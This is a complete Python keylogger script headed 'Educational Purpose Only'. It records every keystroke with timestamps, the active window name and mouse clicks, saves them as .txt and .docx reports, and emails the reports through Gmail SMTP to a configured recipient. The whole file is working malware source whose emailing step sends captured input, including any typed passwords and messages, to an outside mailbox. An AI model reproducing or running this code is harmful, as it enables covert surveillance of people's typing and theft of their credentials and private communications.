# ============================================================
# KEYLOGGER - Educational Purpose Only
# ============================================================

# --- IMPORTS ---
from pynput import keyboard, mouse
from datetime import datetime
from docx import Document
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import pygetwindow as gw
import smtplib
import os

# ============================================================
# SECTION 1: CONFIGURATION
# ============================================================

FLUSH_AFTER        = 10
EMAIL_FROM         = "sender@example.com"
EMAIL_TO           = "recipient@example.com"
EMAIL_PASS         = "your_app_password_here"
OUTPUT_FOLDER      = "keylogger_info_files"
session_start_time = datetime.now()

# ============================================================
# SECTION 2: OUTPUT FOLDER SETUP
# ============================================================

def setup_output_folder():
    if not os.path.exists(OUTPUT_FOLDER):
        os.makedirs(OUTPUT_FOLDER)
        print(f"Created folder: {OUTPUT_FOLDER}")

# ============================================================
# SECTION 3: FILE NAMES
# ============================================================

def get_base_name():
    date_str  = session_start_time.strftime("%Y-%m-%d")
    start_str = session_start_time.strftime("%H-%M-%S")
    end_str   = datetime.now().strftime("%H-%M-%S")
    return f"{date_str}_{start_str}_to_{end_str}_keylog"

def get_log_file():
    date_str  = session_start_time.strftime("%Y-%m-%d")
    start_str = session_start_time.strftime("%H-%M-%S")
    base      = f"{date_str}_{start_str}_to_ongoing_keylog"
    return os.path.join(OUTPUT_FOLDER, f"{base}.txt")

def get_final_filenames():
    base      = get_base_name()
    txt_file  = os.path.join(OUTPUT_FOLDER, f"{base}.txt")
    docx_file = os.path.join(OUTPUT_FOLDER, f"{base}.docx")
    return txt_file, docx_file

# ============================================================
# SECTION 4: BUFFER & FILE WRITING
# ============================================================

buffer = []

def log_key(key_text):
    buffer.append(key_text)
    if len(buffer) >= FLUSH_AFTER:
        flush_buffer()

def flush_buffer():
    if buffer:
        with open(get_log_file(), "a") as f:
            f.write("".join(buffer))
        buffer.clear()

# ============================================================
# SECTION 5: ACTIVE WINDOW
# ============================================================

# Keys that should be completely silent (not logged at all)
SILENT_KEYS = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.caps_lock,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.alt_gr,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
    keyboard.Key.cmd_l,
}

def get_active_window():
    try:
        title = gw.getActiveWindow().title

        # Strip the changing part from Notepad title
        # Notepad title format: "*I'm Chenitha - Notepad"
        # We only want the app name: "Notepad"
        if " - " in title:
            # Get only the last part after final " - "
            app_name = title.split(" - ")[-1]
            return app_name
        return title
    except:
        return "Unknown"

# ============================================================
# SECTION 6: KEY CALLBACKS
# ============================================================

current_window = ""
current_line   = []

def on_press(key):
    global current_window, current_line

    timestamp  = datetime.now().strftime("%H:%M:%S")
    new_window = get_active_window()

    # When app changes — flush current word FIRST, then log window change
    if new_window != current_window:
        current_window = new_window

        # Flush buffered word before logging window switch
        if current_line:
            word = "".join(current_line)
            log_key(f"[{timestamp}] {word}\n")
            current_line = []

        log_key(f"\n[Window: {current_window}]\n")

    try:
        current_line.append(key.char)

    except AttributeError:
        if key in SILENT_KEYS:
            return
        elif key == keyboard.Key.space:
            word = "".join(current_line)
            if word:
                log_key(f"[{timestamp}] {word} ")
            else:
                log_key(" ")
            current_line = []
        elif key == keyboard.Key.enter:
            word = "".join(current_line)
            log_key(f"[{timestamp}] {word}\n")
            current_line = []
        elif key == keyboard.Key.backspace:
            if current_line:
                current_line.pop()
            else:
                log_key("[BACKSPACE]")
        elif key == keyboard.Key.tab:
            word = "".join(current_line)
            log_key(f"[{timestamp}] {word}    ")
            current_line = []
        elif key == keyboard.Key.esc:
            pass
        else:
            log_key(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        global current_line
        if current_line:
            word = "".join(current_line)
            log_key(f"{word}\n")
            current_line = []
        return False

# ============================================================
# SECTION 7: MOUSE CALLBACK
# ============================================================

def on_click(x, y, button, pressed):
    if pressed:
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_key(f"[{timestamp}] [CLICK {button} at ({x},{y})]\n")

# ============================================================
# SECTION 8: CREATE DOCX REPORT
# ============================================================

def create_docx_report(log_content, docx_file):
    date_str  = session_start_time.strftime("%Y-%m-%d")
    start_str = session_start_time.strftime("%H:%M:%S")
    end_str   = datetime.now().strftime("%H:%M:%S")

    doc = Document()
    doc.add_heading("Keylogger Report", 0)
    doc.add_paragraph(f"Date          : {date_str}")
    doc.add_paragraph(f"Session Start : {start_str}")
    doc.add_paragraph(f"Session End   : {end_str}")
    doc.add_paragraph(f"Output Folder : {OUTPUT_FOLDER}")
    doc.add_heading("Captured Log", level=1)

    for line in log_content.split("\n"):
        doc.add_paragraph(line)

    doc.save(docx_file)
    print(f"Report created: {docx_file}")

# ============================================================
# SECTION 9: FINALIZE FILES
# ============================================================

def finalize_files():
    global current_line

    # Flush any remaining typed word
    if current_line:
        word = "".join(current_line)
        log_key(f"{word}\n")
        current_line = []

    # Flush buffer to disk
    flush_buffer()

    old_txt_file          = get_log_file()
    final_txt, final_docx = get_final_filenames()

    # Rename ongoing .txt to final name with end time
    if os.path.exists(old_txt_file):
        os.rename(old_txt_file, final_txt)
        print(f"Log renamed to: {final_txt}")
    else:
        print("No log file found to rename.")
        return None, None

    # Read content and create docx
    with open(final_txt, "r") as f:
        log_content = f.read()

    create_docx_report(log_content, final_docx)

    return final_txt, final_docx

# ============================================================
# SECTION 10: EMAIL REPORT
# ============================================================

def send_log_email(txt_file, docx_file):
    try:
        date_str  = session_start_time.strftime("%Y-%m-%d")
        start_str = session_start_time.strftime("%H-%M-%S")

        msg            = MIMEMultipart()
        msg["Subject"] = f"Keylogger Report - {date_str} {start_str}"
        msg["From"]    = EMAIL_FROM
        msg["To"]      = EMAIL_TO

        body = MIMEText("Please find the keylogger report attached (.txt and .docx).")
        msg.attach(body)

        for attach_file in [txt_file, docx_file]:
            if attach_file and os.path.exists(attach_file):
                with open(attach_file, "rb") as f:
                    attachment = MIMEBase("application", "octet-stream")
                    attachment.set_payload(f.read())
                    encoders.encode_base64(attachment)
                    attachment.add_header(
                        "Content-Disposition",
                        f"attachment; filename={os.path.basename(attach_file)}"
                    )
                    msg.attach(attachment)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_FROM, EMAIL_PASS)
            server.send_message(msg)

        print("Email sent with .txt and .docx attachments.")

    except Exception as e:
        print("Email failed:", e)

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":

    setup_output_folder()

    session_start = session_start_time.strftime("%Y-%m-%d %H:%M:%S")
    log_key(f"\n--- Session started: {session_start} ---\n")

    print("Keylogger running. Press ESC to stop.")
    print(f"Logging to: {get_log_file()}")

    # Start mouse listener in background
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    # Start keyboard listener — blocks until ESC
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as kb_listener:
        kb_listener.join()

    # Finalize and send
    final_txt, final_docx = finalize_files()
    send_log_email(final_txt, final_docx)
    mouse_listener.stop()

    print(f"\nDone! Files saved in: {OUTPUT_FOLDER}/")
    print(f"  {os.path.basename(final_txt)}")
    print(f"  {os.path.basename(final_docx)}")